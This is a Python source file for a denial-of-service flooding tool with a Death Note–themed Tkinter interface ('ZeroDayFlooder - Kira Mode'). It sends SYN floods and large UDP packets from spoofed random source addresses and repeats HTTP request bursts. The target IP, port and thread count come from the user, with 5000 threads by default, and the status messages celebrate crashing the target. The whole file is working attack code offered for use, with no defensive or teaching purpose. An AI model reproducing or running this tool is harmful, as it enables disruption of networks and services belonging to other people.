from scapy.all import *
from threading import Thread
import random
import time
import tkinter as tk
from tkinter import Canvas, Button, Entry, Label
from PIL import Image, ImageTk
import math
import base64
from io import BytesIO
import socket
import requests  # Added for URL image loading

# Core flood functions
target = '192.168.1.1'
port = 80
threads = 5000

def RandomIP():
    return ".".join(map(str, (random.randint(0,255) for _ in range(4))))

def RandomBuffer(size):
    return bytes(random.randint(0,255) for _ in range(size))

def SYN_flood():
    while True:
        try:
            src = RandomIP()
            SYN = IP(src=src, dst=target)/TCP(sport=random.randint(1024,65535), dport=port, flags='S')
            send(SYN, verbose=0)
        except Exception as e:
            pass

def UDP_blast():
    while True:
        try:
            src = RandomIP()
            payload = RandomBuffer(random.randint(1024, 65535))
            UDPp = IP(src=src, dst=target)/UDP(sport=random.randint(1024,65535), dport=port)/payload
            send(UDPp, verbose=0)
        except Exception as e:
            pass

def HTTP_bomb():
    while True:
        try:
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n" * 1000
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            s.send(request.encode())
            s.close()
        except Exception as e:
            pass

# GUI Class with Light animation
class ZeroDayGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("ZeroDayFlooder - Kira Mode")
        self.root.geometry("600x400")
        self.root.config(background='black')

        tk.Label(self.root, text="Target IP:", fg='red', bg='black').pack()
        self.target_entry = Entry(self.root, bg='gray')
        self.target_entry.insert(0, target)
        self.target_entry.pack()

        tk.Label(self.root, text="Port:", fg='red', bg='black').pack()
        self.port_entry = Entry(self.root, bg='gray')
        self.port_entry.insert(0, str(port))
        self.port_entry.pack()

        tk.Label(self.root, text="Threads:", fg='red', bg='black').pack()
        self.threads_entry = Entry(self.root, bg='gray')
        self.threads_entry.insert(0, str(threads))
        self.threads_entry.pack()

        self.flood_btn = Button(self.root, text="Activate Flood", fg='white', bg='red', command=self.start_flood)
        self.flood_btn.pack(pady=10)

        self.status = Label(self.root, text="Ready to destroy...", fg='green', bg='black')
        self.status.pack()

        self.canvas = Canvas(self.root, width=300, height=200, bg='black')
        self.canvas.pack(pady=10)
        self.load_light_image()
        self.anim_active = False

        self.root.mainloop()

    def load_light_image(self):
        try:
            url = "https://wallpapers.com/images/hd/lights-evil-laugh-death-note-phone-4umq6cf3lh7na8cg.jpg"
            response = requests.get(url)
            img = Image.open(BytesIO(response.content))
            img = img.resize((150, 200), Image.LANCZOS)
            self.light_img = ImageTk.PhotoImage(img)
            self.canvas.create_image(75, 0, anchor='nw', image=self.light_img)
        except Exception as e:
            self.canvas.create_text(150, 100, text="Light Yagami", fill='red', font=('Arial', 16))
            self.canvas.create_oval(150, 50, 150, 150, fill='gray')

    def start_flood(self):
        global target, port, threads
        try:
            target = self.target_entry.get()
            port = int(self.port_entry.get())
            threads = int(self.threads_entry.get())
        except ValueError:
            self.status.config(text="Invalid port or thread count!", fg='yellow')
            return

        self.status.config(text="Flooding... Kira rising!", fg='red')
        self.flood_btn.config(state='disabled')
        self.anim_death_laugh()
        for i in range(threads):
            try:
                t1 = Thread(target=SYN_flood, daemon=True)
                t2 = Thread(target=UDP_blast, daemon=True)
                t3 = Thread(target=HTTP_bomb, daemon=True)
                t1.start()
                t2.start()
                t3.start()
                time.sleep(0.01)
            except Exception as e:
                continue

    def anim_death_laugh(self):
        self.anim_active = True
        def anim_loop(frame=0):
            if not self.anim_active:
                return
            self.canvas.delete('all')
            # Draw the image again in the animation area
            try:
                self.canvas.create_image(75, 0, anchor='nw', image=self.light_img)
            except:
                pass
            angle = frame * 5
            xoffset = math.sin(math.radians(angle)) * 20
            self.canvas.create_oval(75 + xoffset, 50, 225 + xoffset, 150, fill='gray')
            self.canvas.create_oval(100 + xoffset, 70, 110 + xoffset, 80, fill='red')
            self.canvas.create_oval(190 + xoffset, 70, 200 + xoffset, 80, fill='red')
            self.canvas.create_arc(140 + xoffset, 100, 160 + xoffset, 130, start=0, extent=180, fill='white')
            if frame % 10 == 0:
                self.canvas.create_text(150, 180, text="Kuhuhuhuhuh!", fill='yellow', font=('Arial', 12, 'bold'))
            yoffset = math.sin(frame * 10) * 5
            self.canvas.create_text(150, 20 + yoffset, text="Light Yagami", fill='red', font=('Arial', 14))
            if frame > 50:
                alpha = int(255 * (1 - (frame - 50)/50))
                alpha = max(0, min(255, alpha))
                self.canvas.create_text(150, 100, text="Shadow of Kira", fill=f'#{alpha:02x}0000')
                if frame > 100:
                    self.anim_active = False
                    self.status.config(text="Target crashed – Light's laugh echoes!")
                    return
            self.root.after(50, lambda: anim_loop(frame + 1))
        anim_loop(0)

if __name__ == '__main__':
    app = ZeroDayGUI()
